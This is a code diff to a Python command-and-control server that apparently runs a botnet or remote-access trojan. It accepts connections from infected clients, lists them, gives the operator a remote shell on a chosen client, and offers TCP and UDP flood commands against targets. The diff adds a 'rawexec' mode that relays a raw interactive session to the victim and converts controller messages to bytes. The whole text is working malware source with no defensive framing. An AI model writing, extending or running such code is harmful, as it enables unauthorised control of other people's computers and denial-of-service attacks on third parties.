@@ -22,7 +22,7 @@
 ## FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 ## IN THE SOFTWARE.
 
-import os, sys, time
+import os, sys, time, select
 from socket import *
 
 if (len(sys.argv) == 4):
@@ -94,7 +94,7 @@ def getConnections():
 #Proper Sending to Controller-->
 def sendController(msg, q):
   try:
-    q.send(bytes(msg, 'utf-8'))
+    q.send(msg)
     return 1 #success
   except Exception as ex: print('[SERVER] Error:', ex); return 0 #fail
   
@@ -123,28 +123,28 @@ def main():
 
       if (command == "accept"):
         getConnections()
-        if (sendController("[SERVER] Done Accepting\n", q) == 0): break
+        if (sendController(bytes("[SERVER] Done Accepting\n", 'utf-8'), q) == 0): break
 
       elif(command == "list"):
         temporary = ""
         for item in allAddresses: temporary += "%d - %s|%s\n" % (
           allAddresses.index(item) + 1, str(item[0]), str(item[1]))
         if (temporary != ""):
-          if (sendController(temporary, q) == 0): break
+          if (sendController(bytes(temporary, 'utf-8'), q) == 0): break
         else:
-          if (sendController("[SERVER] No clients\n", q) == 0): break
+          if (sendController(bytes("[SERVER] No clients\n", 'utf-8'), q) == 0): break
 
       elif("interact " in command):
         chosenone = int(command.replace("interact ","")) - 1
         if ((chosenone < len(allAddresses)) and (chosenone >= 0 )):
-          if (sendController("[SERVER] Interacting with %s\n" % str(
-            allAddresses[chosenone]), q) == 0): break
+          if (sendController(bytes("[SERVER] Interacting with %s\n" % str(
+            allAddresses[chosenone]), 'utf-8'), q) == 0): break
 
           try:
             allConnections[chosenone].send(bytes("hellows123", 'utf-8'))
-            vtpath = allConnections[chosenone].recv(20480).decode() + "> "
+            vtpath = allConnections[chosenone].recv(20480).decode() + "$ "
 
-            if (sendController(vtpath, q) == 0): break
+            if (sendController(bytes(vtpath, 'utf-8'), q) == 0): break
 
             while 1:
               if (time.time() > timeout): #5 minutes passed
@@ -158,30 +158,43 @@ def main():
                 break
               
               try: #Pass it out to Client and Send back the Response
-                if ("cd " in data):
+                if "cd " in data:
                   allConnections[chosenone].send(bytes(data, 'utf-8'))
                   msg=allConnections[chosenone].recv(20480).decode()
-                  vtpath = msg + "> "
-                  if (sendController(vtpath, q) == 0):
+                  vtpath = msg + "$ "
+                  if (sendController(bytes(vtpath, 'utf-8'), q) == 0):
                     breakit = True
                     break
-                elif (data == "stop"): break
+                elif data == "stop": break
+                elif "rawexec" in data:
+                    allConnections[chosenone].send(bytes(data, 'utf-8'))
+                    while True:
+                        flag = False
+                        read_sockets, _, _ = select.select([allConnections[chosenone], q], [], [])
+                        for sock in read_sockets:
+                            if sock == q:
+                                allConnections[chosenone].send(q.recv(20480))
+                            else:
+                                data = allConnections[chosenone].recv(20480)
+                                if data.decode()=='stop': flag = True
+                                sendController(data, q)
+                        if flag: break
                 else:
                   allConnections[chosenone].send(bytes(data, 'utf-8'))
                   msg=allConnections[chosenone].recv(20480).decode()
-                  if (sendController(msg, q) == 0):
+                  if (sendController(bytes(msg, 'utf-8'), q) == 0):
                     breakit = True
                     break
               except:
-                if (sendController(cli_err, q) == 0):
+                if (sendController(bytes(cli_err, 'utf-8'), q) == 0):
                   breakit = True
                   break
                 break
           except:
-            if (sendController(cli_err, q) == 0):break
+            if (sendController(bytes(cli_err, 'utf-8'), q) == 0):break
             getConnections()
         else:
-          if (sendController("[SERVER - ERROR] Client doesn't exist\n",
+          if (sendController(bytes("[SERVER - ERROR] Client doesn't exist\n", 'utf-8'),
                              q) == 0): break
 
       elif ("udpfloodall " in command or "tcpfloodall " in command):
@@ -202,7 +215,7 @@ def main():
         q.close()
         break
       else:
-        if (sendController("[SERVER - ERROR] Invalid Command\n",
+        if (sendController(bytes("[SERVER - ERROR] Invalid Command\n", 'utf-8'),
                            q) == 0): break
 
 while 1:
